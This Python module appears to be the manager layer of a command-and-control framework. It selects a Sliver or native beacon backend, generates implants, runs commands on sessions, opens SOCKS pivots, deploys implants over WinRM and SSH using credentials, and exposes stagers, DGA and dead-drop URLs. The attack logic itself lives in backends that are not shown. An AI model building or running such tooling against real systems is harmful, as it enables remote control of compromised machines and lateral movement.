import os
import time
import logging
from collections import defaultdict
from typing import Optional

from .models import C2Session, ImplantConfig, TaskResult
from .noop_backend import NoopBackend

logger = logging.getLogger("c2_manager")

RATE_LIMIT_REGISTER = int(os.getenv("C2_RATE_LIMIT_REGISTER", "10"))
RATE_LIMIT_WINDOW = int(os.getenv("C2_RATE_LIMIT_WINDOW", "60"))
MAX_CONCURRENT_SESSIONS = int(os.getenv("C2_MAX_SESSIONS", "500"))


class RateLimiter:
    def __init__(self, max_requests: int, window_seconds: int):
        self._max = max_requests
        self._window = window_seconds
        self._buckets: dict[str, list[float]] = defaultdict(list)

    def allow(self, key: str) -> bool:
        now = time.time()
        cutoff = now - self._window
        bucket = self._buckets[key]
        bucket[:] = [t for t in bucket if t > cutoff]
        if len(bucket) >= self._max:
            return False
        bucket.append(now)
        return True

    def prune(self):
        now = time.time()
        cutoff = now - self._window * 2
        for key in list(self._buckets.keys()):
            self._buckets[key] = [t for t in self._buckets[key] if t > cutoff]
            if not self._buckets[key]:
                del self._buckets[key]


class C2Manager:
    def __init__(self):
        self._backend = NoopBackend()
        self._sessions: dict[str, C2Session] = {}
        self._proxy_map: dict[str, str] = {}
        self._rate_limiter = RateLimiter(RATE_LIMIT_REGISTER, RATE_LIMIT_WINDOW)
        self._initialized = False

    @property
    def backend_available(self) -> bool:
        return self._backend.available

    @property
    def active_sessions(self) -> list[C2Session]:
        return list(self._sessions.values())

    def check_rate_limit(self, source_ip: str) -> bool:
        allowed = self._rate_limiter.allow(source_ip)
        if not allowed:
            logger.warning(f"Rate limit exceeded for {source_ip}")
        return allowed

    def can_register(self) -> bool:
        current = len(self._sessions)
        if current >= MAX_CONCURRENT_SESSIONS:
            logger.warning(f"Max sessions reached ({current}/{MAX_CONCURRENT_SESSIONS})")
            return False
        return True

    async def init(self, backend: str = "auto"):
        if self._initialized:
            return
        self._initialized = True

        if backend == "sliver" or (backend == "auto" and os.getenv("SLIVER_OPERATOR_CONFIG")):
            try:
                from .sliver_backend import SliverBackend
                sb = SliverBackend()
                await sb._ensure_client()
                if sb.available:
                    self._backend = sb
                    logger.info("C2: using Sliver backend")
                    return
            except Exception:
                logger.debug("Non-critical error", exc_info=True)

        if backend == "native" or backend == "auto":
            try:
                from .native_backend import NativeC2Backend
                nb = NativeC2Backend()
                if nb.available:
                    self._backend = nb
                    logger.info("C2: using Native beacon backend")
                    return
            except Exception:
                logger.debug("Native backend unavailable", exc_info=True)

        if backend == "noop":
            self._backend = NoopBackend()
            logger.info("C2: using Noop backend (no agent capability)")

    async def refresh_sessions(self) -> list[C2Session]:
        sessions = await self._backend.list_sessions()
        self._sessions = {s.id: s for s in sessions}
        self._rate_limiter.prune()
        return self.active_sessions

    async def generate_implant(self, config: ImplantConfig) -> bytes:
        return await self._backend.generate_implant(config)

    async def execute(self, session_id: str, command: str) -> TaskResult:
        return await self._backend.send_task(session_id, command)

    async def socks_enable(self, session_id: str, port: int = 0) -> Optional[str]:
        if session_id in self._proxy_map:
            return self._proxy_map[session_id]
        port = port or (1080 + len(self._proxy_map) + 1)
        proxy_url = await self._backend.socks_start(session_id, port)
        if proxy_url:
            self._proxy_map[session_id] = proxy_url
            if session_id in self._sessions:
                self._sessions[session_id].socks_port = port
                self._sessions[session_id].proxy_url = proxy_url
        return proxy_url

    async def socks_disable(self, session_id: str):
        await self._backend.socks_stop(session_id)
        self._proxy_map.pop(session_id, None)
        if session_id in self._sessions:
            self._sessions[session_id].socks_port = None
            self._sessions[session_id].proxy_url = None

    async def deploy_implant_winrm(self, target: str, username: str, password: str) -> Optional[str]:
        if hasattr(self._backend, "deploy_implant_winrm"):
            return await self._backend.deploy_implant_winrm(target, username, password)
        return None

    async def deploy_implant_ssh(self, target: str, username: str, password_or_key: str) -> Optional[str]:
        if hasattr(self._backend, "deploy_implant_ssh"):
            return await self._backend.deploy_implant_ssh(target, username, password_or_key)
        return None

    async def stop(self):
        await self._backend.stop()

    @property
    def native(self):
        """Return native backend if active, else None."""
        from .native_backend import NativeC2Backend
        return self._backend if isinstance(self._backend, NativeC2Backend) else None

    @property
    def beacon(self):
        nb = self.native
        return nb.beacon if nb else None

    @property
    def dga(self):
        nb = self.native
        return nb.dga if nb else None

    @property
    def implant_builder(self):
        nb = self.native
        return nb.builder if nb else None

    def get_python_stager(self, session_id: str = "") -> str:
        nb = self.native
        if nb:
            return nb.get_python_stager(session_id)
        return ""

    def get_powershell_stager(self, session_id: str = "") -> str:
        nb = self.native
        if nb:
            return nb.get_powershell_stager(session_id)
        return ""

    def get_dead_drop_urls(self, count: int = 5) -> list[str]:
        nb = self.native
        if nb:
            return nb.get_dead_drop_urls(count)
        return []


_c2: Optional[C2Manager] = None


def get_c2() -> C2Manager:
    global _c2
    if _c2 is None:
        _c2 = C2Manager()
    return _c2
